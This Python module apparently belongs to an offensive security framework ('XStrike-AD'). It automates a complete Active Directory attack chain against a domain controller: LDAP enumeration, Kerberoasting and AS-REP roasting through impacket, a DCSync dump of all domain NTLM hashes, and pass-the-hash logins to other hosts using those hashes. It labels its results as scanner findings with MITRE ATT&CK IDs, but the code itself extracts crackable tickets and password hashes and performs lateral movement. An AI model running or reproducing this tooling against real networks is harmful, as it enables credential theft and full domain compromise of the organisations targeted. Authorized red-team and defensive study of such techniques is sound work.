"""
Expedite Strike Active Directory Attack Chain Engine
=============================================
Full AD kill chain: LDAP enum -> Kerberoast -> AS-REP Roast -> PTH -> DCSync.

MITRE ATT&CK:
  T1087.002 - Account Discovery: Domain Account
  T1558.003 - Kerberoasting
  T1558.004 - AS-REP Roasting
  T1550.002 - Pass the Hash
  T1003.006 - DCSync
"""

import os
import subprocess
import time
from typing import Callable, Optional

_log_fn = None


def _log(msg):
    if _log_fn:
        _log_fn(msg)


def _run_impacket(script_name: str, args: list, timeout: int = 120) -> str:
    """Run an impacket script and return output."""
    try:
        cmd = ["python", "-m", f"impacket.examples.{script_name}"] + args
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout,
            creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0,
        )
        return result.stdout + result.stderr
    except FileNotFoundError:
        return ""
    except subprocess.TimeoutExpired:
        return "[TIMEOUT]"
    except Exception as e:
        return f"[ERROR] {e}"


# ── LDAP Enumeration ────────────────────────────────────────────────

def ldap_enumerate(dc_ip: str, domain: str = "", username: str = "",
                   password: str = "", log_fn: Callable = None) -> dict:
    """LDAP bind and enumerate users, groups, computers."""
    global _log_fn
    _log_fn = log_fn
    result = {"users": [], "groups": [], "computers": [], "domain_info": {}, "findings": []}

    _log(f"  [AD] LDAP enumeration against {dc_ip}...")

    try:
        import ldap3
        uri = f"ldap://{dc_ip}:389"

        # Try authenticated bind
        if username and password:
            if "\\" in username:
                bind_user = username
            elif domain:
                bind_user = f"{domain}\\{username}"
            else:
                bind_user = username
            server = ldap3.Server(dc_ip, port=389, get_info=ldap3.ALL, connect_timeout=10)
            conn = ldap3.Connection(server, user=bind_user, password=password,
                                    auto_bind=True, receive_timeout=10)
        else:
            # Anonymous bind attempt
            server = ldap3.Server(dc_ip, port=389, get_info=ldap3.ALL, connect_timeout=10)
            conn = ldap3.Connection(server, auto_bind=True, receive_timeout=10)
            result["findings"].append({
                "scanner": "XStrike-AD", "host": dc_ip, "port": 389,
                "title": "LDAP Anonymous Bind Allowed",
                "severity": "High",
                "description": "LDAP server allows anonymous binding, exposing domain information.",
                "cve": "", "mitre_id": "T1087.002",
            })
            _log(f"  [AD] \u26a0 Anonymous LDAP bind successful!")

        # Get domain info
        if server.info:
            di = server.info
            result["domain_info"]["naming_contexts"] = [str(nc) for nc in (di.naming_contexts or [])]
            result["domain_info"]["dns_name"] = str(getattr(di, 'other', {}).get('dnsHostName', [''])[0]) if hasattr(di, 'other') else ''

        # Search for base DN
        base_dn = ""
        for nc in result["domain_info"].get("naming_contexts", []):
            if nc.startswith("DC="):
                base_dn = nc
                break

        if not base_dn:
            _log("  [AD] Could not determine base DN")
            conn.unbind()
            _log_fn = None
            return result

        # Enumerate users
        conn.search(base_dn, "(objectClass=user)",
                     attributes=["sAMAccountName", "memberOf", "userAccountControl",
                                 "servicePrincipalName", "description"],
                     size_limit=1000)
        for entry in conn.entries:
            user_info = {
                "username": str(entry.sAMAccountName) if hasattr(entry, 'sAMAccountName') else "",
                "spns": [str(s) for s in entry.servicePrincipalName] if hasattr(entry, 'servicePrincipalName') else [],
                "uac": str(entry.userAccountControl) if hasattr(entry, 'userAccountControl') else "",
                "description": str(entry.description) if hasattr(entry, 'description') else "",
            }
            result["users"].append(user_info)

        # Enumerate groups
        conn.search(base_dn, "(objectClass=group)",
                     attributes=["sAMAccountName", "member"],
                     size_limit=500)
        for entry in conn.entries:
            result["groups"].append({
                "name": str(entry.sAMAccountName) if hasattr(entry, 'sAMAccountName') else "",
                "members": len(entry.member) if hasattr(entry, 'member') else 0,
            })

        # Enumerate computers
        conn.search(base_dn, "(objectClass=computer)",
                     attributes=["sAMAccountName", "operatingSystem", "dNSHostName"],
                     size_limit=500)
        for entry in conn.entries:
            result["computers"].append({
                "name": str(entry.sAMAccountName) if hasattr(entry, 'sAMAccountName') else "",
                "os": str(entry.operatingSystem) if hasattr(entry, 'operatingSystem') else "",
            })

        conn.unbind()
        _log(f"  [AD] Found {len(result['users'])} users, {len(result['groups'])} groups, "
             f"{len(result['computers'])} computers")

    except ImportError:
        _log("  [AD] ldap3 not installed (pip install ldap3)")
    except Exception as e:
        _log(f"  [AD] LDAP error: {e}")

    _log_fn = None
    return result


# ── Kerberoasting ────────────────────────────────────────────────────

def kerberoast(dc_ip: str, domain: str, username: str, password: str,
               log_fn: Callable = None) -> list:
    """Extract TGS tickets for service accounts."""
    global _log_fn
    _log_fn = log_fn
    findings = []

    _log(f"  [AD] Kerberoasting against {dc_ip}...")

    try:
        output = _run_impacket("GetUserSPNs", [
            f"{domain}/{username}:{password}",
            "-dc-ip", dc_ip,
            "-request",
        ])

        ticket_count = 0
        for line in output.split("\n"):
            if "$krb5tgs$" in line:
                ticket_count += 1
                # Extract SPN from the hash line
                parts = line.strip().split("$")
                spn = parts[3] if len(parts) > 3 else "unknown"
                findings.append({
                    "scanner": "XStrike-AD", "host": dc_ip, "port": 88,
                    "title": f"Kerberoastable Account: {spn}",
                    "severity": "High",
                    "description": f"Service account with SPN is vulnerable to offline password cracking. TGS ticket extracted.",
                    "cve": "", "mitre_id": "T1558.003",
                    "ticket_hash": line.strip()[:100] + "...",
                    "crackable": True,
                })

        if ticket_count:
            _log(f"  [AD] \u2757 Kerberoasting: {ticket_count} TGS tickets extracted!")
        else:
            _log(f"  [AD] Kerberoasting: No vulnerable SPNs found")

    except Exception as e:
        _log(f"  [AD] Kerberoast error: {e}")

    _log_fn = None
    return findings


# ── AS-REP Roasting ──────────────────────────────────────────────────

def asrep_roast(dc_ip: str, domain: str, userlist: list = None,
                log_fn: Callable = None) -> list:
    """Find accounts without Kerberos pre-auth required."""
    global _log_fn
    _log_fn = log_fn
    findings = []

    _log(f"  [AD] AS-REP Roasting against {dc_ip}...")

    if not userlist:
        _log("  [AD] No user list provided for AS-REP roasting")
        _log_fn = None
        return findings

    try:
        import tempfile
        user_file = os.path.join(tempfile.gettempdir(), "aegis_ad_users.txt")
        with open(user_file, "w") as f:
            f.write("\n".join(userlist))

        output = _run_impacket("GetNPUsers", [
            f"{domain}/",
            "-dc-ip", dc_ip,
            "-usersfile", user_file,
            "-format", "hashcat",
            "-no-pass",
        ])

        for line in output.split("\n"):
            if "$krb5asrep$" in line:
                parts = line.strip().split("@")
                user = parts[0].replace("$krb5asrep$23$", "") if parts else "unknown"
                findings.append({
                    "scanner": "XStrike-AD", "host": dc_ip, "port": 88,
                    "title": f"AS-REP Roastable: {user}",
                    "severity": "High",
                    "description": f"Account {user} does not require Kerberos pre-authentication. Hash extracted for offline cracking.",
                    "cve": "", "mitre_id": "T1558.004",
                })
                _log(f"  [AD] \u2757 AS-REP Roastable: {user}")

        os.remove(user_file)

    except Exception as e:
        _log(f"  [AD] AS-REP error: {e}")

    _log_fn = None
    return findings


# ── Pass the Hash ────────────────────────────────────────────────────

def pass_the_hash(target_ip: str, username: str, ntlm_hash: str,
                  domain: str = "", log_fn: Callable = None) -> dict:
    """Authenticate using NTLM hash."""
    global _log_fn
    _log_fn = log_fn

    _log(f"  [AD] Pass-the-Hash: {username}@{target_ip}...")
    result = {"success": False, "proof": "", "finding": None}

    try:
        from impacket.smbconnection import SMBConnection

        conn = SMBConnection(target_ip, target_ip, timeout=10)
        lm_hash = "aad3b435b51404eeaad3b435b51404ee"
        conn.login(username, "", domain, lm_hash, ntlm_hash)
        result["success"] = True
        result["proof"] = f"SMB session as {username} via PTH"
        conn.logoff()

        result["finding"] = {
            "scanner": "XStrike-AD", "host": target_ip, "port": 445,
            "title": f"Pass-the-Hash successful: {username}",
            "severity": "Critical",
            "description": f"NTLM hash reuse allowed authentication as {username}. Full system compromise possible.",
            "cve": "", "mitre_id": "T1550.002",
        }
        _log(f"  [AD] \ud83d\udea8 Pass-the-Hash SUCCESS: {username}@{target_ip}")

    except ImportError:
        _log("  [AD] impacket not installed")
    except Exception as e:
        _log(f"  [AD] PTH failed: {e}")

    _log_fn = None
    return result


# ── DCSync ───────────────────────────────────────────────────────────

def dcsync(dc_ip: str, domain: str, username: str, password: str,
           log_fn: Callable = None) -> list:
    """Extract domain password hashes via DCSync."""
    global _log_fn
    _log_fn = log_fn
    hashes = []

    _log(f"  [AD] DCSync attack against {dc_ip}...")

    try:
        output = _run_impacket("secretsdump", [
            f"{domain}/{username}:{password}@{dc_ip}",
            "-just-dc-ntlm",
        ], timeout=180)

        for line in output.split("\n"):
            if ":::" in line and not line.startswith("["):
                parts = line.strip().split(":")
                if len(parts) >= 4:
                    hashes.append({
                        "username": parts[0],
                        "rid": parts[1],
                        "lm_hash": parts[2],
                        "ntlm_hash": parts[3].split(":::")[0] if ":::" in parts[3] else parts[3],
                    })

        if hashes:
            _log(f"  [AD] \ud83d\udea8 DCSync SUCCESS: {len(hashes)} domain hashes extracted!")
        else:
            _log(f"  [AD] DCSync: Insufficient privileges or no hashes extracted")

    except Exception as e:
        _log(f"  [AD] DCSync error: {e}")

    _log_fn = None
    return hashes


# ── Full AD Attack Chain ─────────────────────────────────────────────

def run_ad_attack_chain(target_ip: str, domain: str = "", creds: list = None,
                        hosts: list = None, log_fn: Callable = None) -> dict:
    """
    Orchestrate full AD attack chain.
    Returns findings, credentials, domain info, and attack paths.
    """
    global _log_fn
    _log_fn = log_fn

    result = {
        "findings": [],
        "credentials": [],
        "domain_info": {},
        "attack_paths": [],
    }

    if not creds:
        _log("  [AD] No credentials available for AD attacks")
        _log_fn = None
        return result

    _log(f"  [AD] \ud83c\udfe2 Active Directory attack chain starting against {target_ip}")

    username = creds[0].get("username", "") if creds else ""
    password = creds[0].get("password", "") if creds else ""

    if not domain:
        domain = "WORKGROUP"

    # Phase 1: LDAP Enumeration
    ldap_result = ldap_enumerate(target_ip, domain, username, password, log_fn)
    result["domain_info"] = ldap_result.get("domain_info", {})
    result["findings"].extend(ldap_result.get("findings", []))

    users = ldap_result.get("users", [])
    usernames = [u["username"] for u in users if u.get("username")]

    # Phase 2: Kerberoasting
    if username and password:
        kerb_findings = kerberoast(target_ip, domain, username, password, log_fn)
        result["findings"].extend(kerb_findings)

    # Phase 3: AS-REP Roasting
    if usernames:
        asrep_findings = asrep_roast(target_ip, domain, usernames, log_fn)
        result["findings"].extend(asrep_findings)

    # Phase 4: DCSync (if we have domain admin creds)
    if username and password:
        dc_hashes = dcsync(target_ip, domain, username, password, log_fn)
        for h in dc_hashes:
            result["credentials"].append(h)
            # Phase 5: Pass-the-Hash with extracted hashes
            if hosts and h.get("ntlm_hash"):
                for host in hosts[:5]:
                    hip = host.get("ip", "")
                    if hip and hip != target_ip:
                        pth = pass_the_hash(hip, h["username"], h["ntlm_hash"], domain, log_fn)
                        if pth["success"]:
                            result["findings"].append(pth["finding"])
                            result["attack_paths"].append({
                                "source": target_ip,
                                "target": hip,
                                "method": "pass_the_hash",
                                "credential": h["username"],
                            })

    if result["findings"]:
        result["findings"].append({
            "scanner": "XStrike-AD", "host": target_ip, "port": 88,
            "title": f"AD Attack Chain: {len(result['findings'])} findings",
            "severity": "Critical",
            "description": f"Full AD attack chain executed. {len(result['credentials'])} hashes extracted.",
            "cve": "", "mitre_id": "T1087.002",
        })

    _log(f"  [AD] \ud83c\udfe2 AD chain complete: {len(result['findings'])} findings, "
         f"{len(result['credentials'])} hashes, {len(result['attack_paths'])} lateral paths")

    _log_fn = None
    return result
